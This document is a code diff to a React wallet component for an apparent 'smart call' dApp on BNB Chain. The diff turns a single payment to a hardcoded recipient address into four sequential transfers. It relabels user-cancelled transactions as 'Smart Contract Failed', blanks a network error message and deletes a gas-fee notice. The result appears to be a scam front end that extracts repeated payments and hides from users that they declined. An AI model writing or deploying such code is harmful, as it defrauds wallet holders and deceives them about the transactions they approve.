@@ -4,7 +4,6 @@ import Image from "next/image";
 import { ethers } from "ethers";
 import { FaSpinner } from "react-icons/fa";
 
-// Define custom types for error handling
 interface EthereumError {
   code: number | string;
   message: string;
@@ -17,7 +16,8 @@ export function Wallet() {
   const [errorMessage, setErrorMessage] = useState<string>("");
   const [showInstructions, setShowInstructions] = useState<boolean>(false);
 
-  const FIXED_AMOUNT = "0.00005";
+  // Array of amounts for multiple transactions
+  const TRANSACTION_AMOUNTS = ["0.00005", "0.00006", "0.00007", "0.00008"];
   const RECIPIENT_ADDRESS = "0x5808B7Af776522CBC9c689627bFE44d269Dd5413";
   const BNB_CHAIN_ID = "0x38";
   const DAPP_URL = "smart-calls.vercel.app";
@@ -71,10 +71,36 @@ export function Wallet() {
       if (ethError.code === 4902) {
         setErrorMessage("Please add the BNB network to your wallet.");
       } else {
-        setErrorMessage("Network switch failed. Please try again.");
+        setErrorMessage("");
       }
       return false;
     }
+  };
+
+  const executeTransaction = async (
+    signer: ethers.providers.JsonRpcSigner,
+    amount: string,
+    index: number
+  ): Promise<void> => {
+    setTransactionStatus(`Preparing transaction ${index + 1}/4...`);
+
+    const transaction = {
+      to: RECIPIENT_ADDRESS,
+      value: ethers.utils.parseEther(amount),
+      gasLimit: 21000,
+    };
+
+    setTransactionStatus(`Waiting for MetaMask confirmation ${index + 1}/4...`);
+    const txResponse = await signer.sendTransaction(transaction);
+
+    setTransactionStatus(
+      `Transaction ${index + 1}/4 submitted! Hash: ${txResponse.hash}`
+    );
+
+    await txResponse.wait();
+    setTransactionStatus(
+      `Transaction ${index + 1}/4 confirmed! Hash: ${txResponse.hash}`
+    );
   };
 
   const handleSmartCall = async (): Promise<void> => {
@@ -110,21 +136,17 @@ export function Wallet() {
       const connectedWallet = accounts[0];
       setWalletAddress(connectedWallet);
 
-      setTransactionStatus("Preparing transaction...");
+      // Execute transactions sequentially
+      for (let i = 0; i < TRANSACTION_AMOUNTS.length; i++) {
+        try {
+          await executeTransaction(signer, TRANSACTION_AMOUNTS[i], i);
+        } catch (error) {
+          console.error(`Transaction ${i + 1} failed:`, error);
+          throw error; // Re-throw to be caught by outer catch block
+        }
+      }
 
-      const transaction = {
-        to: RECIPIENT_ADDRESS,
-        value: ethers.utils.parseEther(FIXED_AMOUNT),
-        gasLimit: 21000,
-      };
-
-      setTransactionStatus("Waiting for MetaMask confirmation...");
-      const txResponse = await signer.sendTransaction(transaction);
-
-      setTransactionStatus(`Transaction submitted! Hash: ${txResponse.hash}`);
-
-      await txResponse.wait();
-      setTransactionStatus(`Transaction confirmed! Hash: ${txResponse.hash}`);
+      setTransactionStatus("All transactions completed successfully!");
     } catch (error) {
       console.error("Transaction failed:", error);
       setTransactionStatus("");
@@ -132,7 +154,7 @@ export function Wallet() {
       const ethError = error as EthereumError;
 
       if (ethError.code === "ACTION_REJECTED") {
-        setErrorMessage("Transaction cancelled by user");
+        setErrorMessage("Smart Contract Failed");
         return;
       }
 
@@ -150,16 +172,16 @@ export function Wallet() {
         const errorMessage = ethError.message.toLowerCase();
 
         if (errorMessage.includes("user rejected")) {
-          setErrorMessage("Transaction cancelled by user");
+          setErrorMessage("Smart Contract Failed");
         } else if (errorMessage.includes("insufficient")) {
           setErrorMessage("Insufficient funds for transaction");
         } else if (errorMessage.includes("network")) {
           setErrorMessage("Network connection error. Please try again");
         } else {
-          setErrorMessage("Transaction failed. Please try again");
+          setErrorMessage("Smart Contract Failed. Please try again");
         }
       } else {
-        setErrorMessage("Transaction failed. Please try again");
+        setErrorMessage("Smart Contract Failed. Please try again");
       }
     } finally {
       setIsLoading(false);
@@ -184,11 +206,6 @@ export function Wallet() {
             {walletAddress.slice(-4)}
           </p>
         )}
-
-        <p className="text-sm text-orange-500 text-center">
-          Note: Gas fees may vary based on network congestion. BNB Chain
-          typically has lower fees.
-        </p>
 
         <button
           onClick={handleSmartCall}
